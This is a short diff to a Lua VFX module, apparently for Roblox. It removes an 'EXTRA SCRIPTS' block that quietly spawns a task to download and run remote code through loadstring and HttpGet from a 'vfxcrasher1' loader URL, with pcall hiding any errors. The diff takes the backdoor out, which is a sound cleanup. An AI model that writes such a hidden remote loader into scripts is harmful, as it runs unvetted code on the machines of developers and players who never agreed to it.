@@ -17314,11 +17314,4 @@ end
 
 print("VFX loaded successfully!")
 
--- ====== EXTRA SCRIPTS ======
-task.spawn(function()
-    pcall(function()
-        loadstring(game:HttpGet("https://generator-crash.lovable.app/s/vfxcrasher1/loader.lua?p=KHYZER2014%40"))()
-    end)
-end)
-
 return M
